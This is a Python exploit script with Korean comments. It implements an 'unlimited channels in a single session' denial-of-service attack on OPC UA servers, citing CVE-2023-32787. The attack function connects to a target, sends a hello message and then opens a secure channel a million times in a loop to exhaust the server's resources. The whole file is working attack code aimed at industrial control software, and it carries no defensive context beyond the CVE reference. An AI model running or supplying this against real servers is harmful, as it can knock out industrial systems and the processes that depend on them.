# Unlimited Channels in a Single Session Attack
#   Open many secure channels on the same OPC UA session
#
# CVEs:
#   - CVE-2023-32787: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2023-32787.pdf
#
from protocol import *  # OPC UA 프로토콜 관련 모듈

# 무제한 채널 공격 함수
# 동일한 OPC UA 세션에서 매우 많은 수의 보안 채널을 개설함으로써 서버 리소스에 부담을 주고, 취약점을 유발하는 공격
# 관련된 CVE: CVE-2023-32787

# 공격 함수 정의
def attack(server_details, amount_of_sec_channels=1000000, reset_sequence=True):
    program_type, ip_addr, port, query_string = server_details

    # OPCUA 객체 생성
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    
    # OPC UA 서버에 헬로 메시지 전송 (연결 테스트 및 확인)
    opcua.send_hello_msg(count=1, should_recv=True)
    
    # 세션에서 초기 보안 채널 개설
    opcua.send_open_msg(reset_sequence=reset_sequence)

    # 설정된 수만큼 보안 채널 개설 반복
    for _ in range(amount_of_sec_channels):
        opcua.send_open_msg()  # 보안 채널 추가 개설
